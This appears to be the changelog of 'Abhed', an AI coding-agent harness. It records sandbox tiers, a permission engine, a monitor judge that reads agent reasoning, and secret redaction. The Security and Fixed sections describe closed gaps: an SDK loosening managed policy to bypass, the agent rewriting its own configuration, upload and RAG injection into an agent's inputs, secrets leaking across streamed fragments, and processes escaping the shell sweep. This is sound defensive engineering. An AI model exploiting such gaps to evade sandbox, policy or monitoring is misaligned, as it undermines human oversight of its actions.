  line (`GET /v1/sessions/{id}/search`). It reads only what the Explorer shows
  and passes over the folders `grep` does; it stops at 2,000 results, 20,000
  files or five seconds and says which, marks a file cut at 100 matches, and
  runs at most two at once per session.
- Workbench: the Explorer makes new files and folders, renames (F2) and
  deletes, from its toolbar and a right-click menu (`POST
  /v1/sessions/{id}/folder`, `/rename`, `/delete`). Each is recorded as the
  person's own command and held to the bash rules and the sandbox. Every
  path it touches, as named and with links followed, and everything inside a
  folder at its old and new path, must be one the workbench would open and a
  save to which the write rules allow.
- Workbench: save all (⌥⌘S / Ctrl Alt S), close the editor tab (⌘W / Ctrl W
  where the browser passes it on), Ctrl \` for the terminal, ⇧⌘F for search,
  the file's path and the cursor above the editor, a prompt before leaving
  with unsaved edits, and open tabs restored after a reload.
- `web/ide/editor.js` has a documented, empty seam where a language server
  will attach; nothing is registered yet.
- `edit` and `write` parse Go, JSON and Python before writing, where a parser
  is available (see the tools guide for Python's conditions). A change that
  would leave a file that parsed no longer parsing is not applied, and the
  model is told the error and the line; an `edit` whose new text is a pasted
  diff is refused the same way. Workbench saves are warned, never refused.
  HawkEYE reports a refused change as `broken-edit`. `tools.syntax_check`:
  `refuse` (default), `report` or `off`. It comes from sessions in which a
  model wrote diff markers into Python files.
- The `monitor` package and a policy step for it: a judge that reads the
  remit, the agent's reasoning and where a call's arguments came from, and
  may only tighten a decision; unavailable means ask, or deny when headless.
  Verdicts are recorded as `monitor.verdict`. The local-model judge follows.
- Workbench chat: a message shows as soon as it is sent, with a *Thinking…*
  line and seconds count until the reply starts; reasoning streams into a
  live block; replies render as markdown built from text, never markup. A
  message sent while the agent works is queued for the next step with **Send
  now** and **Cancel**, and marked delivered when the agent reads it. Esc
  stops a run only when pressed twice.
- `GET /v1/sessions/{id}/queue` and `DELETE /v1/sessions/{id}/queue/{qid}`
  list and withdraw queued messages. A follow-up to a busy session answers
  with a `queue_id`, and the `user.message` that delivers it carries the same
  id; `"interrupt": true` stops the running turn and sends the message fresh.
  A `client_id` on any post is echoed on its `user.message`. The queue routes
  and `/interrupt` answer `421` with `Abhed-Session-Node` for a session
  running on another node, as `/approve` does.
- `agent.reasoning.delta` events carry reasoning as it streams.
  `agent.reasoning` is unchanged and still follows with the whole text.
- The event stream takes `?after=<seq>` as well as `Last-Event-ID`.
- Hooks for the paid editions, all nil or unset by default so the Community
  Edition behaves as before: `auth.LocalAuth.Admit`, asked after a password
  checks out and before a session is issued; `auth.Middleware.Check`, run
  after any provider, token or proxy identifies someone, which ends a refused
  session and answers 403 with the reason (a browser goes to `/?refused=`),
  and which `/v1/whoami` and `/v1/overview` honour too; and
  `server.Options.AdminAudit`, told of every `/v1/admin/*` change. An MCP
  server's URL is recorded without credentials or query, and its command as
  the program alone.
- `auth.LocalAuth.Sessions` lists live local sessions by a digest of their
  cookie, never the cookie, with when each was created, last seen and
  expires; `EndSession` ends one by that digest. `auth.SessionEnder` lets a
  provider end a request's session without answering it.
- In `proxy` mode `/v1/whoami` reports the identity the proxy supplied, and
  the console and workbench show it. Sign-out appears only when the new
  `auth.proxy_logout_url` names the proxy's own.
- `auth.github.orgs`, `auth.github.teams` and `auth.github.allow_any`, for the
  paid editions' GitHub sign-in. Validated in every edition; the Community
  Edition does not otherwise read them.
- The workbench terminal is a shell: each tab is one interactive `bash` in the
  session's sandbox, at the workspace root, with history, completion, state
  between lines and full-screen programs. Tabs can be added, renamed and
  closed; resize, multi-line paste, Ctrl+C and a Kill button work; a banner
  states the sandbox tier, the workspace and the network, and the `none` tier
  is flagged in red. Opening the shell is a judged, recorded `bash` call;
  each line is screened against the deny rules as typed and recorded as the
  new `terminal.input` event. The docs say plainly that the sandbox is the
  boundary and the line checks are best effort. `sandbox.terminal: "lines"`
  keeps the one-checked-command-per-line terminal, which a managed policy
  also gets when it has deny rules for `bash` or for every tool (`*`), or a
  policy hook such as an extension. A page reload reattaches to its shells; a
  shell nobody watches ends after 30 minutes (`sandbox.terminal_idle_minutes`).
  When a shell ends, everything still running in its process session is
  stopped and killed, pass after pass, including jobs started with `nohup`,
  `disown` or `trap '' HUP`; a process that starts a session of its own
  escapes and runs, within the sandbox, until it ends. If the sweep cannot
  run, the server logs a warning (`the shell's session was not swept`) with
  the session, the terminal and the reason. On the `none` and `process` tiers
  a shell runs as the server's user and shares its process limit, so a fork
  bomb there can exhaust it for the server too.
- A session can be opened without a prompt (`POST /v1/sessions` with
  `"workbench": true`). The workbench opens one, so the terminal works as soon
  as the page loads; the first message goes to it. It records
  `session.started`, is owned and listed like any other, and session lists
  now carry each session's `mode`.

### Changed

- **Upgrade note:** `abhed doctor` now exits non-zero when the configuration
  has a key that nothing reads, in any file, the managed one included. A
  pipeline that ran `abhed doctor` cleanly on 1.0.1 may fail on 1.1.0
  until the key is corrected or removed; the warning names the file and the
  key.
- **Upgrade note:** a managed file (`/etc/abhed/config.json`) behind a
  directory that cannot be searched, or a link there to nothing, now stops
  `abhed` instead of being ignored. The SDK now reads the managed file even
  without `ConfigDir`, so an embedder on a host with one is bound by it.
- An unknown permission mode given to `-mode` or the SDK's
  `Options.Mode` is refused; it ran as `default`.
- The SDK applies the configuration's `permissions.ask` rules, as the CLI and
  server do; it ignored them. This only adds prompts.
- The reason given when a call is put to a person is accurate for the tool:
  "running a command needs approval in default mode" for `bash`, "changing a
  file needs approval …" for `edit` and `write`, where every such call read
  "mutating tool requires approval". What is allowed, asked and denied is
  unchanged; only the `reason` text differs.
- **Security-relevant default:** the workbench terminal no longer judges each
  line before it runs. After an upgrade it is an interactive shell, bounded by
  the sandbox, in which `bash` deny rules only screen each line as typed and
  miss what the shell expands, recalls or runs from a script. To keep a policy
  decision on every line, set `sandbox.terminal: "lines"`; a managed policy
  keeps it without that setting when it has deny rules for `bash` or for
  every tool (`*`), or a policy hook such as an extension. Deny rules still
  hold for every tool call, the agent's and a person's.
- The workbench streams replies with one DOM append per frame, follows the
  conversation only when you are at the bottom of it, reconnects from the last
  event it drew rather than replaying the session, draws a tool call's body
  when it is opened, and keeps the Events panel to its latest 500 rows.
- A message queued while the final turn of a run was answering is now
  answered in the same run; before, it waited for the next prompt. One left
  queued by a run that was stopped is delivered ahead of the next prompt.
- The event stream reads events back from the record when the store dropped
  them for a subscriber that fell behind, so none is lost or repeated.
- A `model.call` cut short by an interrupt no longer records the cancelled
  stream as an error; the session ends as `user_interrupt` as before.
- `/v1/whoami` names `sign_out_url` when there is one, and the console and
  workbench draw Sign out only then.
- The workbench editor is now Monaco (MIT), in place of CodeMirror: its
  default keybindings, multiple cursors, minimap, find and replace, folding,
  bracket matching, go to line and go to symbol, and in-browser language
  services for JSON, CSS, HTML, JavaScript and TypeScript. Review uses its
  diff editor, side by side or inline, with Accept and Reject on each change.
  The components under `/ide/vendor/` are now kept and sent gzipped, about
  3.5 MB (14 MB unpacked, for a client without gzip), half of it the
  TypeScript worker, which loads only for JavaScript and TypeScript; the
  binary grows by about 2.4 MB. The workbench's content security policy adds `font-src 'self'` for the editor's
  icon font; its workers are same-origin files, so no `blob:`, `worker-src` or
  `unsafe-eval` is needed, and each is served with its own
  `default-src 'none'; script-src 'self'`.
- The workbench's terminal and editor reopen a session from its record after
  a restart, where they answered 409; if it cannot be reopened, the page opens
  a fresh workbench session. A clean shutdown records `session.ended` for
  workbench sessions nobody has messaged, so they can be reopened.
- A session continued from its record no longer shows the model the calls a
  person made in the workbench, which the model had never seen while the
  session ran, and `recall` no longer returns their results.
- `GET /v1/capabilities` reports the sandbox tier in force and its mechanism,
  not the configured minimum.
- `SECURITY.md` supports the latest 1.x release; earlier 1.x releases are
  asked to upgrade, and 0.x is no longer supported.
- `abhed-bench`: `cache_reported` in the JSON output now means the endpoint
  sent a cached-token figure, zero included, rather than that some prefix was
  cached. A stack that reports zero on every turn gets the no-caching warning,
  worded as such.
- Sessions from the command line, the server and the Go SDK now refuse an edit
  or write that would break a file's syntax, where they applied it before.
  Set `tools.syntax_check` to `report` or `off` to keep the old behaviour;
  the SDK also takes `Options.SyntaxCheck`.

### Deprecated

- `auth.LocalAuth.Whoami`: nothing registers it; the server answers
  `/v1/whoami` for every provider. It goes in 2.0.

### Removed

- The benchmark (`bench/`, `docs/benchmarks`) is no longer part of this
  repository. The three multi-harness rig runs published so far are
  withdrawn: the rig did not give every harness the same conditions. The
  earlier single-file comparison of 2026-09-14 is no longer published either.
  Both remain in this repository's history. A result published later will
  come with its method and raw records, whatever it shows.

### Fixed

- The classic console's **Workbench** link sat with the signed-in user's
  controls, which the console removes on a server without sign-in, so there
  was no way back to the workbench there. It now sits beside the brand, at
  every width.
- `abhed -h`, and an unknown flag, print a synopsis, every subcommand with
  what it does, an edition's own commands, and then the flags; they printed
  the flags alone. `-addr` read as `-addr abhed serve` and now reads as a flag
  with a value. `app.WithCommand` now also ignores `hawkeye`, `migrate`,
  `resolve`, `acp` and `secret`, which Main always dispatched itself.
- On the macOS process tier with the network off, a command could list the
  host's interfaces, LAN address, gateway and VPN tunnels (`ifconfig`,
  `netstat -rn`, `route -n get`, `scutil --nwi`). The sandbox now denies the
  routing sysctls, routing sockets, and the system configuration and network
  services too, as Linux's network namespace does.
  MAC addresses from the I/O registry and the host name stay visible; the
  security posture says so.
- On the macOS process tier, `pytest` and `ls -R` in the workspace failed
  with "Operation not permitted" on `.abhed`. A command may now stat it and
  what it holds, so they pass it by, as `git add -A` does; it still cannot
  list it or read or write its files. `find .` and `du` still report it and
  exit 1.
- A workbench shell ended by the person, by `exit`, Kill, closing its tab,
  closing the session or going unwatched, is recorded with its exit status and
  not as an error, and the record says how it was closed. Only a shell that
  failed to start is an error. A command ended by a signal, the agent's
  `bash` call or one in the workbench terminal, now records 128 plus the
  signal's number as its `exit_code`, as a shell reports it, where it
  recorded -1.
- HawkEYE no longer attributes a person's workbench calls to the model: calls
  with `actor: user` never raise `repeated-failure`, `slow-tool`, `truncated`
  or `borrowed-host`. `no-end` is not raised for a session still running on
  the server; offline, with a shell still open, it says so.
- The workbench chat shows the conversation with the agent. The person's own
  calls (shells, terminal lines, Explorer operations and saves) no longer
  appear in it; they stay in Events and the record, and saves in Changes.
- An administrator whose account has an email address could remove their own
  administrator rights: the guard compared the username with the email. It now
  compares the account itself, and the last administrator cannot be removed by
  anyone.
- A password set by an administrator now has to be changed before anything
  else: until it is, the session reaches only `/account`, `POST /v1/password`,
  `/v1/whoami`, sign-out and static files. A browser is sent to `/account`; an
  API call gets `403 {"error":"password change required"}`. It had been a note
  in the workbench.
- In `proxy` mode, a request whose proxy names no user no longer carries the
  groups in `X-Abhed-Groups`.
- The workbench is where sign-in lands, and the console links to it; it had
  to be reached by typing `/ide`. Switch no longer leads to a 404 on local
  accounts, Admin appears only where an admin page exists, and a local user
  can change their own password at `/account`, which also ends a password an
  administrator set. The workbench shows who is signed in, pages have an
  icon, and the editor files are revalidated so an upgrade never serves a
  stale copy. The authentication guide says which edition has which sign-in,
  and no longer promises API tokens the Community Edition does not issue.
- On the container tier, a workbench terminal command ran the engine's CLI
  with only `TERM` in its environment, so it had no `PATH`, `HOME` or
  `DOCKER_HOST`. It now inherits the host's environment; only the `-e` flags
  reach the container.
- The Explorer no longer collapses every folder when a command finishes; it
  reloads in place and keeps the folders that were open.
- Interrupting or deleting a session that had been continued from its record,
  and was idle, no longer fails on a missing cancel function.
- HawkEYE's `cold-cache` finding no longer fires when the provider reports no
  cached-token figure at all, as some OpenAI-compatible endpoints do; absence
  had been read as zero. `model.call` events record `cache_reported`; a
  record written before this has none, so `cold-cache` is not raised on it.
  (#74)
- A turn that spends its whole output budget reasoning without a tool call
  is a stall, not an answer: the model is told its reply was cut off, the
  next call asks for low reasoning effort, the turn is marked `cut_off` in
  the record and HawkEYE reports `output-cap`. Sessions ended this way; some
  read as completed because a sentence had come out before the cut.

### Security

- **A secret split across streamed fragments reached the record.** The reply
  is recorded as many `agent.delta` events, and redaction ran on each one, so
  a stored value that arrived in two fragments matched in neither: it
  reached the record and the live stream in pieces. `agent.message` was
  always redacted whole. `agent.reasoning.delta` is redacted the same way. The model holds a value only when a prompt or an
  @-mentioned file carried one, since tool output is redacted before it sees
  it. Streamed text is now held back by about the length of the longest
  stored value, redacted with what follows, and released at the end of the
  turn, on error or on interrupt; with no secrets stored nothing is held
  back. `server.Options.Redact` now takes any type with methods
  `Redact([]byte) []byte` and `Span() int`, the length of the longest text
  it replaces; a nil pointer of such a type means no redaction.
- **A value next to a JSON escape could be left in place.** Values were
  matched against the escaped payload, so one whose bytes also occurred
  across an escape (`\u003e`, `\n`) could break the JSON, and tool output
  was then passed on unredacted. Values are now matched in the decoded text
  of each string, and redaction fails closed: text that cannot be redacted
  becomes `[redacted: output withheld]`, and a payload left invalid is
  replaced whole.
- **An embedded agent could loosen the managed configuration.** The SDK let
  `Options.Mode` replace the managed permission mode, including with
  `bypass`, which the CLI and server refuse under a managed file; it never
  marked its policy engine managed, so the workbench terminal's managed
  line-by-line enforcement and the engine's own `bypass` refusal did not
  apply; without `ConfigDir` it did not read the managed file at all; and
  `Options.SyntaxCheck` could turn a managed syntax check off. The CLI's
  `-mode` flag also replaced a managed mode. Now `config.Load` records which
  keys the managed file set, and the CLI's flags and the SDK's `Options` may
  tighten those settings and never loosen them: `bypass` is refused under a
  managed file; a managed `permissions.mode` admits only itself or `plan`;
  a managed `tools.syntax_check` only something stricter; a managed
  `limits.max_turns` only a lower limit; a managed `permissions.allow` or
  `additional_dirs` no additions. Deny rules from a caller are added to the
  managed ones. A refused override is an error from `abhed` and from
  `sdk.New`, never a silent change. The SDK reads the managed file with or
  without `ConfigDir`, marks its engine managed, and wraps bash in the
  configured sandbox when the managed file sets a `sandbox` key (and fails
  when no backend meets its `min_tier`). The interactive `/mode` command is
  bound as `-mode` is. `abhed eval`, which approves every prompt with nobody
  to ask, refuses to run under a managed file. `abhed resolve` runs in a
  pinned managed mode unless `-mode` says otherwise. A refusal names the
  managed file. A managed file behind a directory that cannot be searched,
  or a link at the managed path to nothing, is an error; both were treated
  as absent, as the SDK treated the file when `ConfigDir` was empty. Keys in
  the managed file
  are matched as the JSON decoder matches them, so one it applies, such as
  a key spelt with `ſ`, is also bound and is not reported as unknown.
  Without a managed file, the only changes are the two under Changed: an
  unknown mode is refused, and the SDK applies `permissions.ask`.

## [1.0.1] - 2026-09-22

### Added

- `auth.users_file` (`ABHED_USERS_FILE`): where local accounts are kept when
  there is no database. A deployment points it outside every workspace.
- `app.WithMigrateExtension`: an edition with tables of its own registers
  their schema and the runtime role's privileges, so one `abhed migrate`
  provisions the whole record under the owner and runtime roles.

## [1.0.0] - 2026-09-22

The first major release. From here the command line, the configuration
schema, the event record and the Go SDK (`sdk`) follow semantic versioning:
a change that would break any of them is a 2.0. The other public Go packages
(`server`, `auth`, `store`, `config`, `app`) are supported extension points
whose shape may still move in a minor release, and say so when it does.

### Added

- **The workbench at `/ide`.** An editor with syntax highlighting beside the
  agent, a file tree, a changes view that opens each file for review with
  accept and reject chunk by chunk, a terminal, and HawkEYE live. Edits and
  terminal commands made by the person go through the same policy, sandbox
  and record as the agent's, marked as theirs. `@path` attaches a file to a
  message; select code and press the focus-agent key to ask about it. The
  editor and terminal components are built into the binary, so nothing loads
  from the network.
- **HawkEYE.** `abhed hawkeye`, `/hawkeye` and `GET /v1/sessions/{id}/hawkeye`
  report what a session did from its record alone: per-turn tokens and
  context, the policy step behind every call, files touched, subagents,
  compactions, and deterministic findings — a call to a host that only tool
  output supplied, a credential path, a gap in the record, a redacted secret.
- **Context that keeps its record.** Old and large tool results leave the
  window for a one-line pointer once it passes `context.offload_at`; the full
  text stays in the record and the new `recall` tool reads it back by id,
  text or offset. Nothing is lost from the record; anything dropped from the
  window can be retrieved.
- **Secrets by name.** `abhed secret set NAME` stores a credential outside
  every workspace. The model sees the name, asks for it on one command, and
  gets it only under a `secret(NAME)` allow rule, in every mode. Every event
  is redacted before it is written and every tool result before the model
  reads it; HawkEYE reports a redaction.
- **`abhed resolve <issue-url>`** turns an issue on GitHub, GitLab or
  Gitea/Forgejo — self-hosted instances and their certificate authorities
  included — into a branch in its own worktree, a commit, a push and a pull
  request. Opening the request is its own policy-judged action, `forge_pr`.
- **`abhed acp`** speaks the Agent Client Protocol over stdio, so Zed,
  JetBrains and other editors run Abhed as their agent; their approval dialog
  answers asks and cannot lift a deny.
- **The benchmark rig** (`bench/rig`): several harnesses on one local model
  over multi-file tasks with a validity gate, self-tests, two context
  conditions and paired bootstrap intervals. Results are published whatever
  they say; the first published run is still owed.
- **Scale.** A session's node is recorded and requests routed to it,
  approvals are answered on any node, a node's claim is refreshed while its
  turn runs, and shutdown drains instead of ending turns in flight.
- **`abhed migrate`** and two database roles: an owner that migrates and a
  runtime role that can only append.

### Changed

- The permission mode no longer decides secrets, and a write or edit that
  could not succeed is refused before anyone is asked to approve it.
- A finished terminal command stays readable for a minute, so a short one is
  not lost to a reader that connects late.
- The gosec baseline update refuses a change that would silently drop triaged
  findings.

### Fixed

- Long files in Hindi, Japanese, Russian and other non-Latin scripts were
  refused as binary two times in three.
- A prompt label cut mid-character produced invalid UTF-8 that the database
  refused. Contributed in #38.
- bubblewrap hid a workspace under `/tmp` behind its own tmpfs, so every
  command there failed to start.
- The docs site fails the build when two pages claim one URL instead of
  writing one over the other.

### Security

- **The agent cannot reach its own configuration in any mode.** The file
  tools refuse any path with a `.abhed` component, and the process sandbox
  denies commands reading or writing it, in the workspace and in the home
  directory; `~/.abhed/skills` stays readable. Before this, `auto` and
  `bypass` mode let the write tool rewrite `config.json` or plant
  `users.json`.
- **`/download` withheld nothing.** Any signed-in user could download the
  server's own state (`users.json`, `config.json`) and files a deny rule
  covers. Both are refused now, as the viewer and the agent refuse them.
  Deployments on 0.2.0 should upgrade and treat local account passwords as
  exposed.
- **The audit record is protected from the server's own credentials.** The
  application role owned the tables, so it could truncate them or disable
  the append-only triggers. The runtime role now holds insert and select
  only, a `BEFORE TRUNCATE` trigger stands as well, and the server refuses to
  start as a role that could alter the record. Configure `storage.migrate_dsn`
  for the owner, or `storage.single_role` to keep one role knowingly.
- The egress, credential and configuration boundaries are verified on Linux
  under bubblewrap in a privileged CI job, not only on macOS.

## [0.2.0] - 2026-09-19

### Security

- Uploads no longer land in `.abhed/`, the directory the agent is denied. A
  deployment carrying the ordinary `read(**/.abhed/**)` rule refused every file
  a user attached, and the model reported it as a policy denial for a document
  it had just been handed. Attachments now go to `<workspace>/uploads/`.
- The upload endpoint requires session ownership. Any authenticated caller
  could previously write a file into another user's session directory, which
  the victim's agent then read as untrusted input.
- Policy rules can scope tools whose argument is not `command` or `path`.
  `deny k8s_get(secrets*)` compiled and never fired, and because `k8s_get` is
  read-only the read was auto-approved in auto mode.
- Pipeline tool arguments escape substitutions, so untrusted prior-step or RAG
  output cannot close a JSON string and change the arguments a tool receives.
- The legacy MCP SSE transport pins its POST endpoint to the configured
  origin, so a hostile server cannot redirect client posts — and the auth
  headers they carry — to an arbitrary URL.
- Extension `environ` layers on the inherited environment instead of replacing
  it, so setting one variable no longer drops `HOME`, `PATH` and the locale.

### Added

- `max_budget_tokens` is enforced on the primary agent, not only at
  subagent-spawn time. A session that exhausts its allowance ends with the
  terminal reason `max_budget`.
- Sessions record how full the context was, not only what they cost.
  `context_tokens` and `context_window` sit alongside the cumulative token
  totals in the session record and the `session.ended` event.
- The CLI shows a thinking indicator while the model works, completes slash
  commands as they are typed, and displays the model's reasoning, collapsed by
  default and expanded with `/think`.

### Fixed

- A session ended by server shutdown records the terminal reason `shutdown`
  rather than `user_interrupt`, so the audit log can tell a user stopping a run
  from the process going away.
- Every terminal reason is now either emitted in live code or marked reserved.
  Nine were defined, six reachable, and the README claimed eight.
- `exit` and `quit` end an interactive CLI session. Without a leading slash
  they were sent to the model as a prompt.

### Changed

- CI gates on CVEs, coverage and the adversarial suite. Scans cover the built
  binary and the container image, not only the source, and a scan that does
  not run fails the build rather than reading as clean. Coverage may not drop
  below the recorded floor.

### Documentation

- The `vm` sandbox tier is documented as gVisor, which is what ships, rather
  than a Firecracker or Kata microVM, which does not.
- The security document states that the opt-in network tools execute outside
  the sandbox boundary, and which of them auto mode approves without a prompt.
- Benchmark results separate token count from cost, with the input and output
  split, because tokens are only cost on a hosted per-token API.

## [0.1.0] - 2026-09-15

The first public release of the Community Edition.

### Added
- The agent loop with tool contracts, a tiered execution sandbox, and a
  permission engine whose deny rules hold in every mode.
- Twenty model providers over three wire formats, chosen per session.
- Five ways to run it: interactive, headless (`-p`), JSON events per line,
  JSONL RPC over stdio, and a single-tenant server with a web console.
- A Go SDK that gives your own program the same loop with the same policy
  and audit guarantees, including validated structured output.
- An append-only audit record with replay, fork from any step, and export,
  in memory or in Postgres with row-level security.
- Skills, extensions (JSONL over stdio, veto-only), MCP servers, and
  parallel subagents in git worktrees.
- `abhed doctor`, which proves the endpoint answers, tool calling works,
  and a command runs under the sandbox before you trust a run.
